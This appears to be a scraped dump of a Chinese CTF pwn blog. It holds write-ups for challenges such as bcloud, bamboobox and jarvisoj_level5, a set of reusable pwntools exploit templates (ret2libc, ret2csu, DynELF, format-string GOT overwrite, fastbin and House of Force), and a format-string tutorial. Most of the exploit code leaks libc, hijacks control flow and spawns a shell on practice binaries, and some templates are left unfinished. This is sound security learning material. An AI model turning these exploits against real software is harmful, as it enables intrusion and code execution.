自动播放，移动端浏览器暂时不支持此功能 mutex true 该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停 listmaxheight 340px 播放列表的最大长度 preload auto 音乐文件预载入模式，可选项： none, metadata, auto theme #ad7a86 播放器风格色彩设置 一些报错","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"bcloud","slug":"hof_bcloud","date":"2022-03-25T12:33:06.204Z","updated":"2022-03-28T11:37:19.365Z","comments":true,"path":"2022/03/25/hof_bcloud/","link":"","permalink":"https://fuurinko.github.io/2022/03/25/hof_bcloud/","excerpt":"","text":"overview​ partial relro，可以改got表，也可以劫持hook。 REinit1234567memset(s, 0, 0x50u); puts(&quot;Input your name:&quot;); my_read((int)s, 64, 10); v2 = (char *)malloc(0x40u); dword_804B0CC = (int)v2; strcpy(v2, s); // name is stored in heap welcome(v2); add12345678910111213141516for ( i = 0; i &lt;= 9 &amp;&amp; content_chunk[i]; ++i ) ; if ( i == 10 ) return puts(&quot;Lack of space. Upgrade your account with just $100 :)&quot;); puts(&quot;Input the length of the note content:&quot;); v2 = read_num(); content_chunk[i] = (int)malloc(v2 + 4); if ( !content_chunk[i] ) exit(-1); size_chunk[i] = v2; puts(&quot;Input the content:&quot;); my_read(content_chunk[i], v2, 10); printf(&quot;Create success, the id is %d\\n&quot;, i); result = i; sync_chunk[i] = 0; return result; edit123456789101112puts(&quot;Input the id:&quot;); num = read_num(); if ( num &lt; 0 || num &gt; 9 ) return puts(&quot;Invalid ID.&quot;); v2 = content_chunk[num]; if ( !v2 ) return puts(&quot;Note has been deleted.&quot;); v3 = size_chunk[num]; sync_chunk[i] = 0; puts(&quot;Input the new content:&quot;); my_read(v2, v3, 10); return puts(&quot;Edit success.&quot;); ​ free1234567891011puts(&quot;Input the id:&quot;);num = read_num();if ( num &lt; 0 || num &gt; 9 ) return puts(&quot;Invalid ID.&quot;);ptr = (void *)content_chunk[num];if ( !ptr ) return puts(&quot;Note has been deleted.&quot;);content_chunk[num] = 0;size_chunk[num] = 0;free(ptr);return puts(&quot;Delete success.&quot;); sync1234puts(&quot;Syncing...&quot;);for ( i = 0; i &lt;= 9; ++i ) sub_8048BF5(i);return puts(&quot;Synchronization success.&quot;); 在content chunk中储存了目前已经allocated的chunk的ptr。size chunk储存了chunk的size，sync记录了chunk的上传成功与否。 ​ 可以看到，如果只add一个0x4大小的note，三个记录的chunk的状态如上。 利用确定思路​ 目前先考虑更改got表的做法，劫持hook相对来说更加麻烦，反正都要leak libc。 ​ ps：在调试的时候发现如果是利LD_PRELOAD进行其他版本的libc加载的话，会使libc地址低于heap段，其实影响有限，原因也很好理解，但用关于LD_PRELOAD对于内存空间加载的影响的问题可能后面会写一篇笔记来专门研究。 malloc_hook ​ 程序在开始会申请很多乱七八糟的东西，不太好看。但是核心是先要改top chunk的size为-1,或者说0xffffffff，这里需要一些绕过，之后就相对常规。整体看来除了没有控制size以外似乎没有可以利用的漏洞了。 此外或许可以更改ptr_chunk中top chunk的指针（不过这样似乎就不是hof了）。 ​ 发现一些非常怪异的点，如果用Ld_preload加载自己的libc，那么topchunk和malloc hook的偏移也会改变，并且直接由低地址变为了高地址。需要更改的地址也更小，四舍五入更简单。 漏洞点​ 看了很久，发现一个遗漏的点，在于init() 中，将s copy到v2中，是利用strcpy，这个之前在pwncollege中就被坑过，是一个人尽皆知的trick，利用覆盖空字节进行内存泄露。 ​ 利用这个strcpy我们一共可以找到两个漏洞，第一个是print name的时候对于堆基址的泄露，另外一个是在填org和host的时候覆盖top chunk size为0xffffffff。 ​ 覆盖size为0xffffffff后就相当于一个任意地址写了，为了leak libc，比较常规的思路是覆盖free got为puts got，以此打印atoi got来leak。leak之后利用edit来改atoi got为system从而getshell。 泄露堆指针12345p.recvuntil(&quot;Input your name:\\n&quot;)p.sendline(b&#x27;a&#x27;*64)p.recvuntil(b&#x27;Hey&#x27;)heap_base = u32(p.recv()[65:69])log.success(&#x27;heap_base: &#x27; + hex(heap_base)) ​ 我不理解，这个东西为什么还能有成功率。 修改top chunk size123offset = heap_base - malloc_hook_addr - 0xd0 + 0x8add(offset,b&#x27;a&#x27;)#chunk0,change top chunk ptr 覆盖free got, leak libc base12345678910payload = p32(4)*32payload += p32(free_got_addr)#chunk1payload += p32(atoi_got_addr)#chunk2payload += p32(atoi_got_addr)#chunk3edit(1,p32(printf_plt_addr))#modify the free to printffree(2)#print atoi_addratoi_addr = u32(p.recv(4))libc_base = atoi_addr - libc.symbols[&#x27;atoi&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;] getshell1234edit(3,p32(system_addr))add(10,b&#x27;/bin/sh\\x00&#x27;)","categories":[{"name":"HEAP - House Of Force","slug":"HEAP-House-Of-Force","permalink":"https://fuurinko.github.io/categories/HEAP-House-Of-Force/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"hitcon_training11","slug":"hof_hitcontraininf11","date":"2022-03-24T14:16:18.934Z","updated":"2022-03-26T04:16:56.035Z","comments":true,"path":"2022/03/24/hof_hitcontraininf11/","link":"","permalink":"https://fuurinko.github.io/2022/03/24/hof_hitcontraininf11/","excerpt":"","text":"% meting “7342554262” “netease” “playlist” “theme:#555” “mutex:true” “listmaxheight:340px” “preload:auto” %} re​ 含有后门函数，直接的想法是利用hof将chunk分配至某个可写的位置，然后覆盖为后门。 1234v4 = malloc(0x10uLL); *v4 = hello_message; v4[1] = goodbye_message; (*v4)(); 123case 5: v4[1](); exit(0); ​ 观察到程序首先allocate了一个0x10 size的chunk来保存一个问候和再见的消息的指针，并且在程序结束的时候会对其进行调用，所以我们只要将告别的指针覆盖为magic()就能getshell。也就是将0x603268覆盖为0x400D49。 利用更改top chunk size​ 由于程序直接给了无size限制的edit功能，所以只需要利用edit将top chunk的size以及pre size修改就可。 123add(48,b&#x27;aaaa&#x27;)gdb.attach(r)edit(0,64,b&#x27;a&#x27;*56+p64(0xffffffffffffffff)) ​ 申请target addr​ 这样就大致将top chunk的size修改为一个非常大的size了，以供我们申请任意size的chunk，实现将topchunk ptr指向target addr的效果。 ​ 回想一下，现在top chunk的ptr是。。。为什么有随机化啊。 ​ （随机化的小插曲大概是由于整个ubuntu的环境并没有禁用aslr）现在需要让top chunk ptr由32b0指向3268。 123malloc_size = -0x69#-（0x30+0x20+0x8+0xf+0x2)add(malloc_size,b&#x27;aaa&#x27;)add(0x10,p64(magic)*2) ​ ​ 可以看到top chunk已经指向0x603250了，所以这时候只需要add 0x10的chunk覆盖指针，就行。 ​ exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *libc = ELF(&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;goodbye_addr = 0x603268magic = 0x400D49#ar = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;,&quot;./bamboobox&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/64/lib/libc.so.6&quot;&#125;)#r = process(&quot;./bamboobox&quot;)def add(size, name): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(name)def edit(idx, size, name): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(name)def free(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def show(): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;)add(48,b&#x27;aaaa&#x27;)edit(0,64,b&#x27;a&#x27;*56+p64(0xffffffffffffffff))malloc_size = -0x69add(malloc_size,b&#x27;aaa&#x27;)add(0x10,p64(magic)*2)r.recvuntil(&quot;:&quot;)r.sendline(&quot;5&quot;)r.interactive()","categories":[{"name":"HEAP - House Of Force","slug":"HEAP-House-Of-Force","permalink":"https://fuurinko.github.io/categories/HEAP-House-Of-Force/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"一些板子","slug":"一些板子","date":"2022-03-21T08:45:02.536Z","updated":"2022-03-28T14:48:01.544Z","comments":true,"path":"2022/03/21/一些板子/","link":"","permalink":"https://fuurinko.github.io/2022/03/21/%E4%B8%80%E4%BA%9B%E6%9D%BF%E5%AD%90/","excerpt":"","text":"stackret2shellcode123456789101112from pwn import*from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./&quot;)elf = ELF(&quot;./&quot;)shellcode = shellcraft.amd64.open(&quot;/flag&quot;) shellcode += shellcraft.amd64.read(&#x27;rax&#x27;, &#x27;rsp&#x27;, 0x20)shellcode += shellcraft.amd64.write(1, &#x27;rsp&#x27;, 0x20)shellcode = asm(shellcraft.amd64.sh()) ret2libc1234567891011121314151617181920212223242526272829303132333435363738from pwn import*from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./&quot;)elf = ELF(&quot;./&quot;)0ffset = puts_plt = elf.plt[&#x27;puts&#x27;]libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]main = elf.symbols[&#x27;main&#x27;]payload = b&#x27;a&#x27;* offset + p64(puts_plt) + p64(main) + p64(libc_start_main_got)p.recvline()p.sendlineafter(b&#x27;?&#x27;,payload)libc_start_main_addr = u64(p.recv()[0:8])print(p64(libc_start_main_addr))libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;* offset + p64(system_addr) + p64(0xdeadbeef) + p64(binsh_addr)p.sendline(payload)p.interactive() ret2csu12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import*from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;#libc = ELF(&quot;&quot;)elf = ELF(&quot;./level3_x64&quot;)p = process(&quot;./level3_x64&quot;)0ffset = csu_front_addr = 0x400690csu_end_addr = 0x4006AAputs_plt = elf.plt[&#x27;puts&#x27;]libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]main = elf.symbols[&#x27;main&#x27;]write_got = elf.got[&#x27;write&#x27;]read_got = elf.got[&#x27;read&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b&#x27;a&#x27; * offset payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += &#x27;a&#x27; * (offset - 0x48) payload += p64(last) p.send(payload) sleep(1)csu(0, 1, write_got, 8, write_got, 1, main_addr)write_addr = u64(p.recv(8))libc = LibcSearcher(&#x27;write&#x27;, write_addr)libc_base = write_addr - libc.dump(&#x27;write&#x27;)execve_addr = libc_base + libc.dump(&#x27;execve&#x27;)log.success(&#x27;execve_addr &#x27; + hex(execve_addr))&#x27;&#x27;&#x27;libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)log.success(&#x27;system_addr &#x27; + hex(system_addr))&#x27;&#x27;&#x27;csu(0, 1, read_got, 16, bss_base, 0, main_addr)p.send(p64(execve_addr) + &#x27;/bin/sh\\x00&#x27;)p.recvuntil(&#x27;Hello, World\\n&#x27;)## execve(bss_base+8)csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)p.sendline(payload)p.interactive() DynELF123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *# context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./bof&#x27;)p = process(&#x27;./bof&#x27;)p.recvline()offset = 112write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]start_addr = 0x080483d0bss_addr = 0x0804a020pppr_addr = 0x0804856cret_addr = 0x08048484def leak(addr): payload = b&#x27;a&#x27;*offset payload += p32(write_plt) payload += p32(ret_addr) payload += p32(1) payload += p32(addr) payload += p32(4) p.send(payload) data = p.recv() log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (addr, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return datad = DynELF(leak,elf = elf)system_addr = d.lookup(&#x27;system&#x27;,&#x27;libc&#x27;)log.info(&quot;system address: 0x%x&quot; % system_addr)#ret2vulnpayload = b&#x27;a&#x27;*offsetpayload += p32(read_plt)payload += p32(pppr_addr)payload += p32(0)payload += p32(bss_addr)payload += p32(8)payload += p32(system_addr)payload += p32(ret_addr)payload += p32(bss_addr)p.send(payload)p.send(&#x27;/bin/sh\\x00&#x27;)p.interactive() FMT（利用pwntools的fmt module实现自动化修改got） 32bit1234567891011121314151617181920212223242526272829303132333435from pwn import *elf = ELF(&#x27;./&#x27;)r = process(&#x27;./&#x27;)libc = ELF(&#x27;/&#x27;)# 计算偏移量def exec_fmt(payload): r.sendline(payload) info = r.recv() return info auto = FmtStr(exec_fmt)offset = auto.offset# 获得 func 的 got 地址func_got = elf.got[&#x27;func&#x27;]#func通常是一些例如printf或puts的函数log.success(&quot;func_got =&gt; &#123;&#125;&quot;.format(hex(func_got)))# 获得 func 的真实地址payload = p32(func_got) + &#x27;%&#123;&#125;$s&#x27;.format(offset)r.send(payload)func_addr = u32(r.recv()[4:8])log.success(&quot;func_addr =&gt; &#123;&#125;&quot;.format(hex(func_addr)))# 获得 system 的真实地址system_addr = func_addr - (libc.symbols[&#x27;func&#x27;] - libc.symbols[&#x27;system&#x27;])log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;)r.send(payload)r.send(&#x27;/bin/sh&#x27;)r.recv()r.interactive() 64bit1 Heapfastbin_attack_uaf12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;&#x27;&#x27;&#x27;if args[&#x27;REMOTE&#x27;]: p = remote(&quot;&quot;)else: &#x27;&#x27;&#x27;p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)def cmd(idx): p.recvuntil(&quot;Your choice :&quot;) p.sendline(str(idx))def add(size,content): cmd(1) p.recvuntil(&#x27;Note size :&#x27;) p.sendline(str(size)) p.recvuntil(&quot;Content :&quot;) p.sendline(content)def free(idx): cmd(2) p.recvuntil(&#x27;Index :&#x27;) p.sendline(str(idx))def put(idx): cmd(3) p.recvuntil(&#x27;Index :&#x27;) p.sendline(str(idx)) add(0x20,b&quot;aabb&quot;)#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]add(0x20,b&quot;aabb&quot;)#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]free(0)&#x27;&#x27;&#x27;main_arena =&gt; chunk0_print(0x10) =&gt; chunk0_content(0x20)&#x27;&#x27;&#x27;free(1)&#x27;&#x27;&#x27;fastbin:main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)&#x27;&#x27;&#x27;gdb.attach(p)add(8,p32(magic))#chunk2, with 0x10 puts_field and 0x8 content field ,the memory space is poniter to chunk1_print and chunk0_print put(0)p.interactive() House of Force123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from pwn import *libc = ELF(&quot;./libc.so.6&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process([&quot;/glibc/2.19/32/lib/ld-2.19.so&quot;,&quot;./&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.19/32/lib/libc-2.19.so&quot;&#125;)#p = process(&#x27;./&#x27;)elf = ELF(&#x27;./&#x27;)top_chunk_addr = malloc_hook_addr = atoi_got_addr = elf.got[&#x27;atoi&#x27;]free_got_addr = elf.got[&#x27;free&#x27;]printf_plt_addr = elf.plt[&#x27;printf&#x27;]def cmd(idx): p.recvuntil(&quot;option---&gt;&gt;&quot;) p.sendline(str(idx))def add(size,content): cmd(1) p.recvuntil(&quot;Input the length of the note content:&quot;) p.sendline(str(size)) p.recvuntil(&quot;Input the content:&quot;) p.sendline(content)def edit(idx,content): cmd(3) p.recvuntil(&quot;Input the id:&quot;) p.sendline(str(idx)) p.recvuntil(&quot;Input the new content:&quot;) p.sendline(content)def free(idx): cmd(4) p.recvuntil(&quot;Input the id:&quot;) p.sendline(str(idx))def sync(): cmd(5) def exit(): cmd(6)p.recvuntil()p.sendline()p.recvuntil()heap_base = u32(p.recv(4))log.success(&#x27;heap_base: &#x27; + hex(heap_base))p.recvuntil()p.sendlineafter()#gdb.attach(p)p.sendlineafter(, p32(0xffffffff))offset = heap_base - malloc_hook_addr - 0xd0 + 0x8add(offset,b&#x27;a&#x27;)#chunk0,change top chunk ptrlibc_base = atoi_addr - libc.symbols[&#x27;atoi&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]edit(3,p32(system_addr))add(10,b&#x27;/bin/sh\\x00&#x27;)p.interactive()","categories":[{"name":"Generalization","slug":"Generalization","permalink":"https://fuurinko.github.io/categories/Generalization/"}],"tags":[{"name":"summary","slug":"summary","permalink":"https://fuurinko.github.io/tags/summary/"}]},{"title":"pwn知识点总结","slug":"pwn知识点总结","date":"2022-03-21T07:55:07.636Z","updated":"2022-03-25T11:57:54.263Z","comments":true,"path":"2022/03/21/pwn知识点总结/","link":"","permalink":"https://fuurinko.github.io/2022/03/21/pwn%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/","excerpt":"","text":"[TOC] stack漏洞点控制程序执行流栈溢出ret2syscall​ 利用程序自带的gadget，构造syscall。 ​ 对应板子 ret2libcret2shellcode泄露内存格式化字符串1）泄露任意地址123456--------获取栈变量对应的地址------------%n$p #输出栈上第n+1个格式化字符串输出参数--------获取栈变量对应的字符串----------%n$s#输出栈上第n+1个格式化字符串参数对应的字符串--------获取任意地址内容---------------addr%n$s Extra:​ 对于格式化字符串地址偏移的计算，32位和64位并不完全相同，32位参数完全由栈传递，所以参数在栈上出现的位次即是偏移（要减去返回地址占的位次），但是64位传参前六位是由寄存器传参，因此在栈上找到的偏移需要加6。 数组越界覆盖空字节​ 修改内存格式化字符串利用fmt_payload模块自动化写入1payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;) 手工构造原理%n参数不输出字符，但是把已成功输出的字符个数写入对应整形指针参数所指的变量。 1addr%k$n#k为格式化字符串偏移，addr为需要覆盖的地址 12%hhn #向地址写入单字节%hn #向地址写入双字节","categories":[{"name":"Generalization","slug":"Generalization","permalink":"https://fuurinko.github.io/categories/Generalization/"}],"tags":[{"name":"summary","slug":"summary","permalink":"https://fuurinko.github.io/tags/summary/"}]},{"title":"mrctf2020_shellcode_revenge","slug":"mrctf2020_shellcode_revenge","date":"2022-03-19T17:18:00.923Z","updated":"2022-03-20T04:31:59.139Z","comments":true,"path":"2022/03/20/mrctf2020_shellcode_revenge/","link":"","permalink":"https://fuurinko.github.io/2022/03/20/mrctf2020_shellcode_revenge/","excerpt":"","text":"mrctf2020_shellcode_revengeoverview 看起来像ret2shellcode。 逆向​ 不知道为什么ida不能一键f5，不过也懒得修了，程序逻辑也比较简单，就是一个write和read。然后程序会对输入的字符进行ascii码的大小的比较， ​ ​ 分析一下这个流程图，我们的目的是执行loc_1236，一共有三个箭头指向它，归纳以后分别是(0x60,0x7A),(0x2f,0x5A),ascii在这些范围内的字符会被读入buf，然后call rax，也就是执行了我们输入的shellcode。 利用​ 由于题目本身的设置，我们并不需要像常规那样先泄露什么栈上的地址，只需要绕过题目的检测。虽然但是，搞不懂这个字符ackii码的限制意义何在。去摸了一下ackii表，发现这个范围内的字符都是数字或者字母。 ​ 所以把shellcode转换成这些范围内的字符，然后直接传输就行。 ​","categories":[{"name":"STACK - Stack Overflow","slug":"STACK-Stack-Overflow","permalink":"https://fuurinko.github.io/categories/STACK-Stack-Overflow/"}],"tags":[{"name":"EZ_STACK","slug":"EZ-STACK","permalink":"https://fuurinko.github.io/tags/EZ-STACK/"}]},{"title":"jarvisoj_level5","slug":"ret2csu","date":"2022-03-19T17:15:06.878Z","updated":"2022-03-20T04:32:43.333Z","comments":true,"path":"2022/03/20/ret2csu/","link":"","permalink":"https://fuurinko.github.io/2022/03/20/ret2csu/","excerpt":"","text":"jarvisoj_level5​ 这个题吧，我好像以前做过，是个纯纯的ret2csu的板子题。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import*from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;#libc = ELF(&quot;&quot;)elf = ELF(&quot;./level3_x64&quot;)p = process(&quot;./level3_x64&quot;)0ffset = 0x88#(test)csu_front_addr = 0x400690csu_end_addr = 0x4006AAputs_plt = elf.plt[&#x27;puts&#x27;]libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]main = elf.symbols[&#x27;main&#x27;]write_got = elf.got[&#x27;write&#x27;]read_got = elf.got[&#x27;read&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b&#x27;a&#x27; * offset payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += &#x27;a&#x27; * (offset - 0x48) payload += p64(last) p.send(payload) sleep(1)csu(0, 1, write_got, 8, write_got, 1, main_addr)write_addr = u64(p.recv(8))libc = LibcSearcher(&#x27;write&#x27;, write_addr)libc_base = write_addr - libc.dump(&#x27;write&#x27;)execve_addr = libc_base + libc.dump(&#x27;execve&#x27;)log.success(&#x27;execve_addr &#x27; + hex(execve_addr))&#x27;&#x27;&#x27;libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)log.success(&#x27;system_addr &#x27; + hex(system_addr))&#x27;&#x27;&#x27;csu(0, 1, read_got, 16, bss_base, 0, main_addr)p.send(p64(execve_addr) + &#x27;/bin/sh\\x00&#x27;)p.recvuntil(&#x27;Hello, World\\n&#x27;)## execve(bss_base+8)csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)p.sendline(payload)p.interactive()","categories":[{"name":"STACK - Stack Overflow","slug":"STACK-Stack-Overflow","permalink":"https://fuurinko.github.io/categories/STACK-Stack-Overflow/"}],"tags":[{"name":"ret2csu","slug":"ret2csu","permalink":"https://fuurinko.github.io/tags/ret2csu/"}]},{"title":"PicoCTF_2018_got-shell","slug":"PicoCTF_2018_got-shell","date":"2022-03-19T17:15:01.790Z","updated":"2022-03-20T04:32:12.448Z","comments":true,"path":"2022/03/20/PicoCTF_2018_got-shell/","link":"","permalink":"https://fuurinko.github.io/2022/03/20/PicoCTF_2018_got-shell/","excerpt":"","text":"PicoCTF_2018_got-shell​ 虽然但是，这个题为什么这么pwncollege。guide的风格，函数的名字。。。完全一致好吧。 ​ 可以写4字节，正好可以修改got表为后门函数。那就修改puts咯？","categories":[{"name":"STACK - OTHERS","slug":"STACK-OTHERS","permalink":"https://fuurinko.github.io/categories/STACK-OTHERS/"}],"tags":[{"name":"EZ_STACK","slug":"EZ-STACK","permalink":"https://fuurinko.github.io/tags/EZ-STACK/"}]},{"title":"格式化字符串","slug":"fmt","date":"2022-03-18T17:22:00.000Z","updated":"2022-03-23T12:33:19.176Z","comments":true,"path":"2022/03/19/fmt/","link":"","permalink":"https://fuurinko.github.io/2022/03/19/fmt/","excerpt":"","text":"1）前言​ 绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。 ​ 首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。 ​ 所以碰到这道题，算是又给我敲了第nn个警钟。 ​ 非常清晰地告诉我：我是垃圾。 2）格式化字符串基本原理​ ctfwiki上的格式化字符串教程写得挺好的，可以参考。 格式化字符串参数1%[parameter][flags][field width][.precision][length]type parameter %n$，获取格式化字符串中的指定参数 field width 输出的最小宽度 precision 输出的最大长度 length，输出的长度 hh，输出一个字节 h，输出一个双字节 type d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 s，如果没有用 l 标志，输出 null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。 c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。 p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 格式化字符串漏洞利用一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。 一般来说不正确的方式有这几种 一直%s，容易引用不合法的地址，造成程序崩溃 通过打印的相关内存信息，泄露内存布局，获得有用的信息 重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现 1）32位偏移计算原理​ 其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。 ​ 准确来说应该是格式化字符串在栈上的偏移。 ​ 原理也比较简单：x86架构下，格式化字符串是通过栈传递的。 ​ 然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。 ​ 举一个例子，源码来源于3.1.1 格式化字符串漏洞 12345//test1.c#include&lt;stdio.h&gt;void main() &#123; printf(&quot;%s %d %s&quot;, &quot;Hello World!&quot;, 233, &quot;\\n&quot;);&#125; ​ 这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。 ​ 我们以32位编译。 1gcc -m32 test1.c -o test1 ​ 在main函数处下一个断点。然后执行到断点处。 ​ 随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从stack 部分我们可以看到，此时栈里已经有一个参数”\\n”。 ​ 继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。 ​ 可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子： ​ 然后回忆一下被调函数参数和局部变量压栈的过程： ​ 主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。 ​ 这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。 2）64位偏移计算原理​ 原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。 3） pwntools_fmtstr工具​ 在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。 